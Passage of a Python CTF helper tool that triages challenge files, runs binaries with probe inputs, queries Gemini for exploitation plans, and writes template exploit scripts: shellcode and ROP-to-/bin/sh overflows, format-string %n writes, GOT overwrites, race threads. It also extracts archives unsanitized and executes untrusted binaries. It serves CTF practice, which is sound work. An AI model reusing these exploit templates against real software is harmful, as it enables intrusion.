#!/usr/bin/env python3
"""
PWN AI Analyzer - Unified AI-powered tool for automatic CTF analysis
Automatically analyzes files, identifies challenge types and solves them
"""

import os
import sys
import json
import hashlib
import subprocess
import zipfile
import tarfile
import requests
from pathlib import Path
import mimetypes
import re
import time
from datetime import datetime

# Importaciones opcionales
try:
    import magic
    MAGIC_AVAILABLE = True
except ImportError:
    MAGIC_AVAILABLE = False
    print("[-] python-magic not available. Using basic type detection.")

try:
    import google.generativeai as genai
    GEMINI_AVAILABLE = True
except ImportError:
    GEMINI_AVAILABLE = False
    print("[-] google-generativeai not available. AI analysis disabled.")

# Intentar importar pwntools
try:
    from pwn import *
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False
    print("[-] pwntools not available. Some functions will be limited.")

class PWNAIAnalyzer:
    def __init__(self, gemini_api_key=None):
        self.gemini_api_key = gemini_api_key
        self.analysis_results = {}
        self.challenges_found = []
        self.flags_found = []
        self.working_directory = "./analysis_workspace"
        self.setup_workspace()
        
        if gemini_api_key:
            self.setup_gemini()
    
    def setup_workspace(self):
        """Configurar directorio de trabajo"""
        os.makedirs(self.working_directory, exist_ok=True)
        os.makedirs(f"{self.working_directory}/extracted", exist_ok=True)
        os.makedirs(f"{self.working_directory}/exploits", exist_ok=True)
        os.makedirs(f"{self.working_directory}/flags", exist_ok=True)
        print(f"[+] Workspace configurado en: {self.working_directory}")
    
    def setup_gemini(self):
        """Configurar Gemini AI"""
        if not GEMINI_AVAILABLE:
            print("[-] Gemini AI no disponible")
            self.model = None
            return
            
        try:
            genai.configure(api_key=self.gemini_api_key)
            self.model = genai.GenerativeModel('gemini-1.5-pro-latest')
            print("[+] Gemini AI configurado exitosamente")
        except Exception as e:
            print(f"[-] Error configurando Gemini: {e}")
            self.model = None
    
    def analyze_directory(self, directory_path):
        """Analizar directorio completo automáticamente"""
        print(f"\n🔍 ANALIZANDO DIRECTORIO: {directory_path}")
        print("=" * 60)
        
        if not os.path.exists(directory_path):
            print(f"[-] Directorio no existe: {directory_path}")
            return
        
        # Escanear todos los archivos
        all_files = []
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                all_files.append(file_path)
        
        print(f"[+] Encontrados {len(all_files)} archivos para analizar")
        
        # Analizar cada archivo
        for file_path in all_files:
            self.analyze_single_file(file_path)
        
        # Generar reporte final
        self.generate_final_report()
    
    def analyze_single_file(self, file_path):
        """Analizar un archivo individual"""
        print(f"\n📁 Analizando: {os.path.basename(file_path)}")
        
        try:
            # Información básica del archivo
            file_info = self.get_file_info(file_path)
            
            # Determinar tipo de archivo
            file_type = self.determine_file_type(file_path, file_info)
            
            # Analizar según el tipo
            if file_type == "archive":
                self.handle_archive(file_path)
            elif file_type == "binary":
                self.analyze_binary(file_path)
            elif file_type == "source_code":
                self.analyze_source_code(file_path)
            elif file_type == "web_file":
                self.analyze_web_file(file_path)
            elif file_type == "document":
                self.analyze_document(file_path)
            else:
                self.analyze_unknown_file(file_path)
                
        except Exception as e:
            print(f"[-] Error analizando {file_path}: {e}")
    
    def get_file_info(self, file_path):
        """Obtener información básica del archivo"""
        try:
            stat = os.stat(file_path)
            
            # Intentar obtener tipo MIME
            mime_type = mimetypes.guess_type(file_path)[0]
            
            # Leer primeros bytes para magic number
            with open(file_path, 'rb') as f:
                magic_bytes = f.read(16)
            
            info = {
                "size": stat.st_size,
                "permissions": oct(stat.st_mode)[-3:],
                "mime_type": mime_type,
                "magic_bytes": magic_bytes.hex(),
                "extension": Path(file_path).suffix.lower(),
                "is_executable": os.access(file_path, os.X_OK)
            }
            
            return info
            
        except Exception as e:
            print(f"[-] Error obteniendo info de {file_path}: {e}")
            return {}
    
    def determine_file_type(self, file_path, file_info):
        """Determinar tipo de archivo para análisis"""
        magic_bytes = file_info.get("magic_bytes", "")
        extension = file_info.get("extension", "")
        mime_type = file_info.get("mime_type", "")
        
        # Archivos comprimidos
        if (magic_bytes.startswith("504b") or  # ZIP
            magic_bytes.startswith("1f8b") or  # GZIP
            extension in [".zip", ".tar", ".gz", ".7z", ".rar"]):
            return "archive"
        
        # Binarios ejecutables
        if (magic_bytes.startswith("7f454c46") or  # ELF
            magic_bytes.startswith("4d5a") or      # PE
            file_info.get("is_executable", False)):
            return "binary"
        
        # Código fuente
        if extension in [".c", ".cpp", ".py", ".js", ".php", ".java", ".go", ".rs"]:
            return "source_code"
        
        # Archivos web
        if extension in [".html", ".htm", ".css", ".js", ".json"]:
            return "web_file"
        
        # Documentos
        if extension in [".txt", ".md", ".pdf", ".doc", ".docx"]:
            return "document"
        
        return "unknown"
    
    def handle_archive(self, file_path):
        """Manejar archivos comprimidos"""
        print(f"📦 Archivo comprimido detectado: {os.path.basename(file_path)}")
        
        extract_path = f"{self.working_directory}/extracted/{os.path.basename(file_path)}_extracted"
        os.makedirs(extract_path, exist_ok=True)
        
        try:
            if file_path.endswith('.zip'):
                with zipfile.ZipFile(file_path, 'r') as zip_ref:
                    zip_ref.extractall(extract_path)
            elif file_path.endswith(('.tar', '.tar.gz', '.tgz')):
                with tarfile.open(file_path, 'r:*') as tar_ref:
                    tar_ref.extractall(extract_path)
            
            print(f"[+] Extraído en: {extract_path}")
            
            # Analizar contenido extraído
            self.analyze_directory(extract_path)
            
        except Exception as e:
            print(f"[-] Error extrayendo {file_path}: {e}")
    
    def analyze_binary(self, file_path):
        """Analizar binario ejecutable con técnicas avanzadas"""
        print(f"⚙️  Binario ejecutable detectado: {os.path.basename(file_path)}")
        
        analysis = {
            "file_path": file_path,
            "type": "binary",
            "vulnerabilities": [],
            "protections": {},
            "strings": [],
            "functions": [],
            "potential_exploits": [],
            "challenge_type": "unknown",
            "exploitation_techniques": []
        }
        
        # Análisis básico con strings
        try:
            result = subprocess.run(['strings', file_path], 
                                  capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                strings = result.stdout.split('\n')
                analysis["strings"] = [s for s in strings if len(s) > 3][:50]
                
                # Buscar flags en strings
                self.search_flags_in_strings(strings, file_path)
                
                # Detectar tipo de desafío por strings
                self.detect_challenge_type_by_strings(strings, analysis)
                
        except Exception as e:
            print(f"[-] Error ejecutando strings: {e}")
        
        # Análisis con file
        try:
            result = subprocess.run(['file', file_path], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                analysis["file_info"] = result.stdout.strip()
                
        except Exception as e:
            print(f"[-] Error ejecutando file: {e}")
        
        # Análisis con pwntools si está disponible
        if PWNTOOLS_AVAILABLE:
            try:
                elf = ELF(file_path)
                analysis["protections"] = {
                    "nx": elf.nx,
                    "canary": elf.canary,
                    "pie": elf.pie,
                    "relro": elf.relro
                }
                analysis["architecture"] = elf.arch
                analysis["entry_point"] = hex(elf.entry)
                analysis["symbols"] = dict(elf.symbols)
                
                print(f"[+] Arquitectura: {elf.arch}")
                print(f"[+] Protecciones: NX={elf.nx}, Canary={elf.canary}, PIE={elf.pie}")
                
                # Detectar funciones vulnerables
                self.detect_vulnerable_functions(elf, analysis)
                
                # Buscar gadgets ROP si NX está habilitado
                if elf.nx:
                    self.find_rop_gadgets_basic(file_path, analysis)
                
            except Exception as e:
                print(f"[-] Error con pwntools: {e}")
        
        # Intentar ejecutar el binario para ver comportamiento
        self.test_binary_execution(file_path, analysis)
        
        # Determinar técnicas de explotación
        self.determine_exploitation_techniques(analysis)
        
        # Usar IA para análisis avanzado
        if self.model:
            self.ai_analyze_binary_advanced(file_path, analysis)
        
        self.analysis_results[file_path] = analysis
        
        # Generar exploit automático específico
        self.generate_advanced_exploit(file_path, analysis)
    
    def test_binary_execution(self, file_path, analysis):
        """Probar ejecución del binario"""
        print(f"🧪 Probando ejecución del binario...")
        
        try:
            # Ejecución básica
            result = subprocess.run([file_path], 
                                  capture_output=True, text=True, timeout=5)
            analysis["execution_output"] = result.stdout
            analysis["execution_error"] = result.stderr
            
            if "flag" in result.stdout.lower() or "ctf" in result.stdout.lower():
                print(f"[!] Posible flag en output: {result.stdout}")
                self.flags_found.append({
                    "source": file_path,
                    "content": result.stdout,
                    "method": "direct_execution"
                })
            
            # Probar con diferentes inputs
            test_inputs = [
                b"A" * 100,
                b"admin",
                b"password",
                b"flag",
                b"1234",
                b"\x00" * 50
            ]
            
            for test_input in test_inputs:
                try:
                    result = subprocess.run([file_path], 
                                          input=test_input,
                                          capture_output=True, timeout=3)
                    if b"flag" in result.stdout.lower():
                        print(f"[!] Flag encontrada con input: {test_input}")
                        self.flags_found.append({
                            "source": file_path,
                            "content": result.stdout.decode(errors='ignore'),
                            "method": f"input_test_{test_input[:10]}"
                        })
                except:
                    continue
                    
        except Exception as e:
            print(f"[-] Error probando ejecución: {e}")
    
    def analyze_source_code(self, file_path):
        """Analizar código fuente"""
        print(f"📝 Código fuente detectado: {os.path.basename(file_path)}")
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            analysis = {
                "file_path": file_path,
                "type": "source_code",
                "language": self.detect_language(file_path),
                "vulnerabilities": [],
                "suspicious_functions": [],
                "potential_flags": []
            }
            
            # Buscar flags en el código
            self.search_flags_in_text(content, file_path)
            
            # Buscar funciones sospechosas
            suspicious_patterns = [
                r'system\s*\(',
                r'exec\s*\(',
                r'eval\s*\(',
                r'gets\s*\(',
                r'strcpy\s*\(',
                r'sprintf\s*\(',
                r'scanf\s*\('
            ]
            
            for pattern in suspicious_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    analysis["suspicious_functions"].extend(matches)
                    print(f"[!] Función sospechosa encontrada: {matches}")
            
            # Análisis con IA
            if self.model:
                self.ai_analyze_source_code(file_path, content, analysis)
            
            self.analysis_results[file_path] = analysis
            
        except Exception as e:
            print(f"[-] Error analizando código fuente: {e}")
    
    def search_flags_in_strings(self, strings, source_file):
        """Buscar flags en lista de strings"""
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[a-zA-Z0-9_]+\{[a-zA-Z0-9_!@#$%^&*()+=\-\[\]{}|;:,.<>?/~`]+\}'
        ]
        
        for string in strings:
            for pattern in flag_patterns:
                matches = re.findall(pattern, string, re.IGNORECASE)
                for match in matches:
                    print(f"🚩 FLAG ENCONTRADA: {match}")
                    self.flags_found.append({
                        "flag": match,
                        "source": source_file,
                        "method": "string_analysis"
                    })
    
    def search_flags_in_text(self, text, source_file):
        """Buscar flags en texto"""
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[a-zA-Z0-9_]+\{[a-zA-Z0-9_!@#$%^&*()+=\-\[\]{}|;:,.<>?/~`]+\}'
        ]
        
        for pattern in flag_patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                print(f"🚩 FLAG ENCONTRADA: {match}")
                self.flags_found.append({
                    "flag": match,
                    "source": source_file,
                    "method": "text_analysis"
                })
    
    def detect_challenge_type_by_strings(self, strings, analysis):
        """Detectar tipo de desafío por strings"""
        challenge_indicators = {
            "buffer_overflow": ["gets", "strcpy", "scanf", "overflow", "buffer", "smash"],
            "format_string": ["printf", "sprintf", "fprintf", "%s", "%d", "%x", "%n"],
            "rop_chain": ["system", "/bin/sh", "execve", "gadget", "pop", "ret"],
            "heap_exploitation": ["malloc", "free", "heap", "chunk", "tcache"],
            "race_condition": ["thread", "pthread", "race", "concurrent", "mutex"],
            "arbitrary_write": ["write", "read", "memory", "address", "pointer"],
            "unicode_bypass": ["unicode", "utf", "char", "byte", "encoding"],
            "crypto": ["encrypt", "decrypt", "cipher", "key", "hash", "md5", "sha"],
            "reverse_engineering": ["flag", "password", "secret", "hidden", "obfuscated"]
        }
        
        detected_types = []
        confidence_scores = {}
        
        for challenge_type, indicators in challenge_indicators.items():
            score = 0
            for indicator in indicators:
                matches = sum(1 for s in strings if indicator.lower() in s.lower())
                score += matches
            
            if score > 0:
                confidence_scores[challenge_type] = score
                detected_types.append((challenge_type, score))
        
        if detected_types:
            # Ordenar por confianza
            detected_types.sort(key=lambda x: x[1], reverse=True)
            best_type = detected_types[0][0]
            analysis["challenge_type"] = best_type
            analysis["confidence_scores"] = confidence_scores
            print(f"[+] Tipo de desafío detectado: {best_type} (confianza: {detected_types[0][1]})")
            
            # Mostrar otros tipos posibles
            if len(detected_types) > 1:
                other_types = [f"{t[0]}({t[1]})" for t in detected_types[1:3]]
                print(f"[+] Otros tipos posibles: {', '.join(other_types)}")
    
    def detect_vulnerable_functions(self, elf, analysis):
        """Detectar funciones vulnerables en el binario"""
        vulnerable_functions = {
            "gets": "Buffer overflow - no bounds checking",
            "strcpy": "Buffer overflow - no bounds checking", 
            "strcat": "Buffer overflow - no bounds checking",
            "sprintf": "Buffer overflow - no bounds checking",
            "scanf": "Buffer overflow - format string",
            "printf": "Format string vulnerability",
            "system": "Command injection potential",
            "exec": "Command injection potential"
        }
        
        found_vulns = []
        
        try:
            # Buscar en símbolos importados
            for func_name in vulnerable_functions:
                if func_name in elf.symbols:
                    vuln_info = {
                        "function": func_name,
                        "description": vulnerable_functions[func_name],
                        "address": hex(elf.symbols[func_name])
                    }
                    found_vulns.append(vuln_info)
                    print(f"[!] Función vulnerable encontrada: {func_name} @ {hex(elf.symbols[func_name])}")
            
            # Buscar en PLT/GOT
            if hasattr(elf, 'plt') and elf.plt:
                for func_name in vulnerable_functions:
                    if func_name in elf.plt:
                        vuln_info = {
                            "function": func_name,
                            "description": vulnerable_functions[func_name],
                            "plt_address": hex(elf.plt[func_name])
                        }
                        found_vulns.append(vuln_info)
                        print(f"[!] Función vulnerable en PLT: {func_name} @ {hex(elf.plt[func_name])}")
            
            analysis["vulnerable_functions"] = found_vulns
            
        except Exception as e:
            print(f"[-] Error detectando funciones vulnerables: {e}")
    
    def find_rop_gadgets_basic(self, file_path, analysis):
        """Buscar gadgets ROP básicos"""
        print(f"🔍 Buscando gadgets ROP básicos...")
        
        try:
            # Usar ROPgadget si está disponible
            result = subprocess.run(['ROPgadget', '--binary', file_path, '--only', 'pop|ret'], 
                                  capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                gadgets = []
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'pop' in line or 'ret' in line:
                        gadgets.append(line.strip())
                
                analysis["rop_gadgets"] = gadgets[:20]  # Primeros 20 gadgets
                print(f"[+] Encontrados {len(gadgets)} gadgets ROP")
                
        except FileNotFoundError:
            print("[-] ROPgadget no disponible, saltando búsqueda de gadgets")
        except Exception as e:
            print(f"[-] Error buscando gadgets: {e}")
    
    def determine_exploitation_techniques(self, analysis):
        """Determinar técnicas de explotación recomendadas"""
        techniques = []
        
        challenge_type = analysis.get("challenge_type", "unknown")
        protections = analysis.get("protections", {})
        vulnerable_funcs = analysis.get("vulnerable_functions", [])
        
        # Basado en tipo de desafío
        if challenge_type == "buffer_overflow":
            if not protections.get("nx", True):
                techniques.append("shellcode_injection")
            if protections.get("nx", True):
                techniques.append("rop_chain")
            if not protections.get("canary", True):
                techniques.append("stack_smashing")
        
        elif challenge_type == "format_string":
            techniques.extend(["arbitrary_read", "arbitrary_write", "got_overwrite"])
        
        elif challenge_type == "heap_exploitation":
            techniques.extend(["tcache_poisoning", "fastbin_attack", "unsorted_bin_attack"])
        
        elif challenge_type == "rop_chain":
            techniques.extend(["rop_chain", "ret2libc", "ret2syscall"])
        
        # Basado en protecciones
        if not protections.get("pie", True):
            techniques.append("no_aslr_exploitation")
        
        if protections.get("relro") == "Partial":
            techniques.append("got_overwrite")
        
        # Basado en funciones vulnerables
        func_names = [f["function"] for f in vulnerable_funcs]
        if "system" in func_names:
            techniques.append("ret2system")
        if "printf" in func_names:
            techniques.append("format_string_exploit")
        
        analysis["exploitation_techniques"] = list(set(techniques))
        
        if techniques:
            print(f"[+] Técnicas de explotación recomendadas: {', '.join(techniques)}")
    
    def ai_analyze_binary_advanced(self, file_path, analysis):
        """Análisis avanzado de binario con IA"""
        try:
            prompt = f"""
            Analiza este binario ejecutable para CTF con información detallada:
            
            Archivo: {os.path.basename(file_path)}
            Arquitectura: {analysis.get('architecture', 'unknown')}
            Protecciones: {analysis.get('protections', {})}
            Tipo de desafío detectado: {analysis.get('challenge_type', 'unknown')}
            Funciones vulnerables: {[f['function'] for f in analysis.get('vulnerable_functions', [])]}
            Técnicas recomendadas: {analysis.get('exploitation_techniques', [])}
            Strings relevantes: {analysis.get('strings', [])[:15]}
            
            Como experto en PWN y CTFs, por favor:
            1. Confirma o corrige el tipo de desafío identificado
            2. Proporciona un plan de explotación paso a paso
            3. Identifica el offset probable para buffer overflow
            4. Sugiere payloads específicos
            5. Menciona herramientas adicionales necesarias
            6. Si detectas patrones de flags o métodos para obtenerlas, descríbelos
            
            Responde en español con detalles técnicos específicos para PWN.
            """
            
            response = self.model.generate_content(prompt)
            analysis["ai_analysis_advanced"] = response.text
            print(f"🤖 Análisis IA avanzado completado para {os.path.basename(file_path)}")
            
            # Extraer información específica del análisis IA
            self.extract_ai_insights(response.text, analysis)
            
        except Exception as e:
            print(f"[-] Error en análisis IA avanzado: {e}")
    
    def extract_ai_insights(self, ai_response, analysis):
        """Extraer información específica del análisis de IA"""
        try:
            # Buscar offset mencionado
            offset_patterns = [
                r'offset.*?(\d+)',
                r'(\d+).*?bytes?.*?overflow',
                r'buffer.*?(\d+).*?bytes?'
            ]
            
            for pattern in offset_patterns:
                matches = re.findall(pattern, ai_response, re.IGNORECASE)
                if matches:
                    analysis["suggested_offset"] = int(matches[0])
                    print(f"[+] IA sugiere offset: {matches[0]}")
                    break
            
            # Buscar payloads sugeridos
            if "payload" in ai_response.lower():
                analysis["ai_suggested_payloads"] = True
                print(f"[+] IA proporcionó sugerencias de payload")
            
        except Exception as e:
            print(f"[-] Error extrayendo insights de IA: {e}")
    
    def generate_advanced_exploit(self, file_path, analysis):
        """Generar exploit avanzado basado en técnicas de MindCrafters"""
        challenge_type = analysis.get("challenge_type", "unknown")
        
        print(f"🔧 Generando exploit avanzado para tipo: {challenge_type}")
        
        if challenge_type == "unicode_bypass":
            exploit_code = self.generate_unicode_bypass_exploit(file_path, analysis)
        elif challenge_type == "race_condition":
            exploit_code = self.generate_multithreaded_exploit(file_path, analysis)
        elif challenge_type == "arbitrary_write":
            exploit_code = self.generate_arbitrary_write_exploit(file_path, analysis)
        elif challenge_type == "buffer_overflow":
            exploit_code = self.generate_buffer_overflow_exploit(file_path, analysis)
        elif challenge_type == "format_string":
            exploit_code = self.generate_format_string_exploit(file_path, analysis)
        else:
            exploit_code = self.generate_generic_exploit(file_path, analysis)
        
        exploit_file = f"{self.working_directory}/exploits/advanced_exploit_{os.path.basename(file_path)}.py"
        
        try:
            with open(exploit_file, 'w') as f:
                f.write(exploit_code)
            print(f"[+] Exploit avanzado generado: {exploit_file}")
        except Exception as e:
            print(f"[-] Error generando exploit avanzado: {e}")
    
    def ai_analyze_source_code(self, file_path, content, analysis):
        """Análisis de código fuente con IA"""
        try:
            prompt = f"""
            Analiza este código fuente para CTF:
            
            Archivo: {os.path.basename(file_path)}
            Lenguaje: {analysis.get('language', 'unknown')}
            
            Código:
            ```
            {content[:2000]}  # Primeros 2000 caracteres
            ```
            
            Por favor:
            1. Identifica vulnerabilidades de seguridad
            2. Busca posibles flags ocultas o métodos para obtenerlas
            3. Sugiere técnicas de explotación
            4. Identifica funciones o variables sospechosas
            5. Recomienda herramientas de análisis
            
            Responde en español y sé específico sobre técnicas de hacking.
            """
            
            response = self.model.generate_content(prompt)
            analysis["ai_source_analysis"] = response.text
            print(f"🤖 Análisis IA de código fuente completado")
            
        except Exception as e:
            print(f"[-] Error en análisis IA de código fuente: {e}")
    
    def generate_unicode_bypass_exploit(self, file_path, analysis):
        """Generar exploit para bypass Unicode"""
        return f'''#!/usr/bin/env python3
"""
Unicode Bypass Exploit for {os.path.basename(file_path)}
Técnica basada en writeups de MindCrafters
"""

from pwn import *
import codecs

# Configuración
binary_path = "{file_path}"
context.binary = binary_path

def unicode_bypass_exploit():
    """Exploit usando técnicas de bypass Unicode"""
    p = process(binary_path)
    
    # Técnica 1: Bypass usando caracteres Unicode especiales
    unicode_payload = "\\u0041" * 100  # 'A' en Unicode
    
    # Técnica 2: Bypass usando diferentes encodings
    payloads = [
        "admin".encode('utf-16le'),
        "admin".encode('utf-8'),
        "\\x41\\x00" * 50,  # UTF-16 'A'
        "\\xc0\\x80" * 50   # UTF-8 overlong encoding
    ]
    
    for i, payload in enumerate(payloads):
        print(f"[+] Probando payload Unicode {{i+1}}: {{payload[:20]}}")
        try:
            p.sendline(payload)
            response = p.recvline(timeout=2)
            if b"flag" in response.lower():
                print(f"[!] FLAG ENCONTRADA con payload {{i+1}}: {{response}}")
                return response
        except:
            continue
    
    # Técnica 3: Bypass usando normalización Unicode
    import unicodedata
    normalized_payload = unicodedata.normalize('NFKD', 'admin')
    p.sendline(normalized_payload.encode())
    
    p.interactive()

if __name__ == "__main__":
    unicode_bypass_exploit()
'''
    
    def generate_multithreaded_exploit(self, file_path, analysis):
        """Generar exploit multithreaded para race conditions"""
        return f'''#!/usr/bin/env python3
"""
Multithreaded Race Condition Exploit for {os.path.basename(file_path)}
Técnica basada en writeups de MindCrafters
"""

from pwn import *
import threading
import time

# Configuración
binary_path = "{file_path}"
context.binary = binary_path

class RaceConditionExploit:
    def __init__(self):
        self.flag_found = False
        self.result = None
    
    def worker_thread(self, thread_id):
        """Worker thread para race condition"""
        try:
            p = process(binary_path)
            
            # Timing crítico para race condition
            time.sleep(0.001 * thread_id)  # Stagger threads
            
            # Payload específico para race condition
            payload = f"thread_{{thread_id}}_payload".encode()
            p.sendline(payload)
            
            response = p.recvall(timeout=1)
            if b"flag" in response.lower():
                self.flag_found = True
                self.result = response
                print(f"[!] FLAG ENCONTRADA en thread {{thread_id}}: {{response}}")
            
            p.close()
            
        except Exception as e:
            print(f"[-] Error en thread {{thread_id}}: {{e}}")
    
    def exploit(self):
        """Ejecutar exploit multithreaded"""
        print("[+] Iniciando exploit de race condition...")
        
        threads = []
        num_threads = 50  # Número de threads concurrentes
        
        # Crear y lanzar threads
        for i in range(num_threads):
            t = threading.Thread(target=self.worker_thread, args=(i,))
            threads.append(t)
            t.start()
        
        # Esperar a que terminen todos los threads
        for t in threads:
            t.join()
        
        if self.flag_found:
            print(f"[+] Exploit exitoso! Flag: {{self.result}}")
        else:
            print("[-] No se encontró flag con race condition")

if __name__ == "__main__":
    exploit = RaceConditionExploit()
    exploit.exploit()
'''
    
    def generate_arbitrary_write_exploit(self, file_path, analysis):
        """Generar exploit para escritura arbitraria"""
        return f'''#!/usr/bin/env python3
"""
Arbitrary Write Exploit for {os.path.basename(file_path)}
Técnica basada en writeups de MindCrafters
"""

from pwn import *

# Configuración
binary_path = "{file_path}"
context.binary = binary_path

def arbitrary_write_exploit():
    """Exploit usando escritura arbitraria de memoria"""
    p = process(binary_path)
    
    # Técnica 1: Overwrite GOT entry
    if hasattr(context.binary, 'got'):
        target_functions = ['printf', 'puts', 'exit']
        for func in target_functions:
            if func in context.binary.got:
                got_addr = context.binary.got[func]
                print(f"[+] Intentando overwrite {{func}} GOT @ {{hex(got_addr)}}")
                
                # Payload para overwrite GOT
                payload = b"A" * 64  # Ajustar offset
                payload += p64(got_addr)  # Dirección a escribir
                payload += p64(0x41414141)  # Valor a escribir
                
                p.sendline(payload)
                break
    
    # Técnica 2: Stack pivot para control de flujo
    stack_pivot_gadgets = [
        0x400123,  # pop rsp; ret
        0x400456,  # xchg rsp, rax; ret
        0x400789   # mov rsp, rbp; ret
    ]
    
    for gadget in stack_pivot_gadgets:
        print(f"[+] Probando stack pivot con gadget: {{hex(gadget)}}")
        payload = b"A" * 72  # Buffer overflow
        payload += p64(gadget)  # Stack pivot gadget
        payload += p64(0x41414141)  # Nueva stack
        
        p.sendline(payload)
        
        try:
            response = p.recvline(timeout=2)
            if b"flag" in response.lower():
                print(f"[!] FLAG ENCONTRADA: {{response}}")
                return response
        except:
            continue
    
    # Técnica 3: Format string para escritura arbitraria
    format_payloads = [
        b"%8$n",  # Escribir en 8va posición del stack
        b"%10$hn", # Escribir short en 10ma posición
        b"AAAA%8$n",  # Con padding
    ]
    
    for payload in format_payloads:
        print(f"[+] Probando format string: {{payload}}")
        p.sendline(payload)
        
        try:
            response = p.recvline(timeout=2)
            if b"flag" in response.lower():
                print(f"[!] FLAG ENCONTRADA: {{response}}")
                return response
        except:
            continue
    
    p.interactive()

if __name__ == "__main__":
    arbitrary_write_exploit()
'''
    
    def generate_buffer_overflow_exploit(self, file_path, analysis):
        """Generar exploit para buffer overflow"""
        suggested_offset = analysis.get("suggested_offset", 72)
        arch = analysis.get("architecture", "amd64")
        protections = analysis.get("protections", {})
        
        return f'''#!/usr/bin/env python3
"""
Buffer Overflow Exploit for {os.path.basename(file_path)}
Arquitectura: {arch}
Protecciones: {protections}
"""

from pwn import *

# Configuración
binary_path = "{file_path}"
context.binary = binary_path
context.arch = "{arch}"

def buffer_overflow_exploit():
    """Exploit de buffer overflow optimizado"""
    p = process(binary_path)
    
    # Offset sugerido por IA: {suggested_offset}
    offset = {suggested_offset}
    
    # Técnica basada en protecciones
    {"# NX habilitado - usar ROP chain" if protections.get("nx", True) else "# NX deshabilitado - usar shellcode"}
    {"# PIE habilitado - necesario leak" if protections.get("pie", True) else "# PIE deshabilitado - direcciones fijas"}
    {"# Canary habilitado - necesario bypass" if protections.get("canary", True) else "# Sin canary - exploit directo"}
    
    if not {protections.get("nx", True)}:
        # Shellcode injection (NX disabled)
        shellcode = asm(shellcraft.sh())
        payload = shellcode.ljust(offset, b"A")
        payload += p64(0x7fffffffe000)  # Stack address (ajustar)
    
    elif {protections.get("nx", True)} and not {protections.get("pie", True)}:
        # ROP chain (NX enabled, PIE disabled)
        rop = ROP(context.binary)
        
        # Buscar gadgets útiles
        try:
            rop.call('system', ['/bin/sh'])
            payload = b"A" * offset
            payload += rop.chain()
        except:
            # ROP manual si falla automático
            pop_rdi = 0x400123  # Ajustar con gadget real
            system_addr = 0x400456  # Ajustar con dirección real
            bin_sh = 0x400789  # Ajustar con string real
            
            payload = b"A" * offset
            payload += p64(pop_rdi)
            payload += p64(bin_sh)
            payload += p64(system_addr)
    
    else:
        # Exploit genérico
        payload = b"A" * offset
        payload += p64(0x41414141)  # RIP control
    
    print(f"[+] Enviando payload de {{len(payload)}} bytes")
    p.sendline(payload)
    
    # Buscar flag en output
    try:
        response = p.recvall(timeout=5)
        if b"flag" in response.lower():
            print(f"[!] FLAG ENCONTRADA: {{response}}")
        else:
            print(f"[+] Respuesta: {{response}}")
    except:
        pass
    
    p.interactive()

if __name__ == "__main__":
    buffer_overflow_exploit()
'''
    
    def generate_format_string_exploit(self, file_path, analysis):
        """Generar exploit para format string"""
        return f'''#!/usr/bin/env python3
"""
Format String Exploit for {os.path.basename(file_path)}
Técnicas avanzadas de format string
"""

from pwn import *

# Configuración
binary_path = "{file_path}"
context.binary = binary_path

def format_string_exploit():
    """Exploit de format string con técnicas avanzadas"""
    p = process(binary_path)
    
    # Técnica 1: Leak de memoria
    leak_payloads = [
        b"%p " * 20,  # Leak stack
        b"%s",        # Leak string
        b"%x " * 10,  # Leak hex values
    ]
    
    for payload in leak_payloads:
        print(f"[+] Probando leak: {{payload}}")
        p.sendline(payload)
        
        try:
            response = p.recvline(timeout=2)
            print(f"[+] Leak response: {{response}}")
            
            if b"flag" in response.lower():
                print(f"[!] FLAG ENCONTRADA: {{response}}")
                return response
        except:
            continue
    
    # Técnica 2: Escritura arbitraria con %n
    write_payloads = [
        b"AAAA%8$n",   # Escribir en 8va posición
        b"BBBB%10$hn", # Escribir short en 10ma posición
        b"CCCC%12$hhn", # Escribir byte en 12va posición
    ]
    
    for payload in write_payloads:
        print(f"[+] Probando escritura: {{payload}}")
        p.sendline(payload)
        
        try:
            response = p.recvline(timeout=2)
            if b"flag" in response.lower():
                print(f"[!] FLAG ENCONTRADA: {{response}}")
                return response
        except:
            continue
    
    # Técnica 3: GOT overwrite
    if hasattr(context.binary, 'got'):
        target_addr = context.binary.got.get('printf', 0)
        if target_addr:
            # Payload para overwrite GOT
            payload = p32(target_addr)
            payload += b"%8$n"
            
            print(f"[+] Intentando GOT overwrite @ {{hex(target_addr)}}")
            p.sendline(payload)
    
    p.interactive()

if __name__ == "__main__":
    format_string_exploit()
'''
    
    def generate_generic_exploit(self, file_path, analysis):
        """Generar exploit genérico"""
        return f'''#!/usr/bin/env python3
"""
Generic Exploit for {os.path.basename(file_path)}
Exploit genérico con múltiples técnicas
"""

from pwn import *

# Configuración
binary_path = "{file_path}"
context.binary = binary_path

def generic_exploit():
    """Exploit genérico con múltiples técnicas"""
    p = process(binary_path)
    
    # Información del análisis
    print("[+] Información del análisis:")
    print(f"    Tipo de desafío: {analysis.get('challenge_type', 'unknown')}")
    print(f"    Técnicas sugeridas: {analysis.get('exploitation_techniques', [])}")
    print(f"    Funciones vulnerables: {[f['function'] for f in analysis.get('vulnerable_functions', [])]}")
    
    # Técnica 1: Inputs básicos
    basic_inputs = [
        b"admin",
        b"password", 
        b"flag",
        b"1234",
        b"root",
        b"test"
    ]
    
    for inp in basic_inputs:
        print(f"[+] Probando input básico: {{inp}}")
        p.sendline(inp)
        
        try:
            response = p.recvline(timeout=2)
            if b"flag" in response.lower():
                print(f"[!] FLAG ENCONTRADA: {{response}}")
                return response
        except:
            continue
    
    # Técnica 2: Buffer overflow básico
    overflow_sizes = [50, 100, 200, 500, 1000]
    
    for size in overflow_sizes:
        payload = b"A" * size
        print(f"[+] Probando overflow de {{size}} bytes")
        p.sendline(payload)
        
        try:
            response = p.recvline(timeout=2)
